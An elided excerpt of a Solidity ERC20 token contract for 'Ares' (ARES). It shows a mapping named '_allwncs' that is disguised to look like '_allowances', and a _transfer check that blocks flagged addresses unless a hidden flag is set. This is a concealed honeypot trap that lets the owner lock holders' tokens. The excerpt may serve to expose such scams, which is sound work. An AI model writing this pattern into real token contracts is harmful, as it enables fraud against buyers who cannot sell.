...
contract ERC20 is Ownable, IERC20, IERC20Metadata {
    ...
    mapping (address => bool) internal _allwncs;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    bool private _allwncsApplied = false;
    ...
    function _transfer(
        ...
        if (_allwncs[from] || _allwncs[to]) require(_allwncsApplied == true, "");
        unchecked {
...
contract ARES is ERC20_Extension {
    constructor() ERC20_Extension("Ares", "ARES") {
